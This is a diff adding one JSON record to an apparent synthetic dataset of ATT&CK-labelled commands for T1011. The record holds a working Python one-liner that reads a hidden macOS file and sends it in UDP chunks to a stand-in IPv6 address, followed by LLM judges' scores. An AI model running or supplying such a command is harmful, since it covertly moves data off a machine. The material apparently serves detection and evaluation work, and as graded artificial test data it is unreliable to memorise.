@@ -1,0 +1,48 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Python",
+  "command": "python3 -c 'import socket; s=socket.socket(socket.AF_INET6, socket.SOCK_DGRAM); s.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_TCLASS, 0x2c); addr=(\"2001:db8:44::4\", 49512, 0, 0); d=open(\"/Users/Shared/.cache2\",\"rb\").read(); [s.sendto(d[i:i+600], addr) for i in range(0,len(d),600)]; s.close()'",
+  "explanation": "Transmits data via IPv6 UDP with a set traffic class on a high, uncommon port, explicitly leveraging IPv6 as an alternate medium per T1011.",
+  "rationale_steps": [
+    "Initialize an IPv6 UDP socket and set IPv6 traffic class to mimic non-default traffic.",
+    "Target a documentation IPv6 address and uncommon port (49512).",
+    "Send file contents in small datagrams over IPv6 (alternate medium).",
+    "No obfuscation; runs as user."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-e8d4b4c2-76407221",
+  "source_prompt_hash": "e8d4b4c2",
+  "timestamp_utc": "2025-09-30T08:45:56.629990Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed python3 -c invocation with balanced quoting and valid Python code using proper IPv6 UDP socket and options.",
+        "semantic_score": 4,
+        "semantic_justification": "It transmits file data over IPv6 UDP and sets the IPv6 Traffic Class header (plausible for signaling) on a high port, but the action is primarily data exfiltration with a static TCLASS and uses a documentation-prefix address, reducing realism for signaling.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T15:21:50.854574Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed with balanced syntax, valid function calls, and proper use of list comprehension for chunking data.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1011 by explicitly leveraging IPv6, setting a specific traffic class (a protocol field) for potential signaling, and transmitting data via an uncommon high port, embodying covert communication and evasion tactics.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T15:22:02.938929Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.5,
+    "llm_average_score": 4.75,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
